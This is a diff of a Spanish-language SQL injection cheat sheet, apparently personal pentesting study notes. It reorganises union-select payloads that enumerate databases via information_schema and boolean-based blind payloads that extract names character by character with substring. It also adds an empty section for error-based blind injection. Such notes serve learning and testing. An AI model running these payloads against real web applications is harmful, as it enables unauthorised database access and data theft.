@@ -70,18 +70,8 @@ Después de saber cuantas columnas existen podemos usar Union Select para meter 
 Para saber las bases de datos (DB) existentes.
 ```bash 
 ❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
-❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra todas las bases de datos existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes, pero separadas por comas
-
-❯ ' and substr((Consulta)Inicio,longitud))=''                                                   # Forma de usar el substr
-	# Longitud = Los caracteres que vamos a extraer
-	# Inicio = Es la posicion inicial del caracter a comparar 
-	# Consulta = Es la peticion que vamos a hacer
-
-❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MSSQL
-	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
-	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
-	# 'A' es la letra a la que queremos igualar la consulta 
 
 ```
 
@@ -117,6 +107,27 @@ Para que nos muestre los datos de las columnas.
 	 # : = 0x3a (Hex) 
 ```
 
+## Inyecciones Blind con respuesta condicional 
+
+```bash 
+
+❯ ' and substr((Consulta)Inicio,longitud))=''                                                   # Forma de usar el substr
+	# Longitud = Los caracteres que vamos a extraer
+	# Inicio = Es la posicion inicial del caracter a comparar 
+	# Consulta = Es la peticion que vamos a hacer
+
+❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MSSQL
+	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
+	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
+	# 'A' es la letra a la que queremos igualar la consulta 
+```
+
+
+## Inyección Blind con error condicional 
+
+```bash 
+
+```
 
 ## Inyecciones sin ver el error en el Output 'Blind'
 
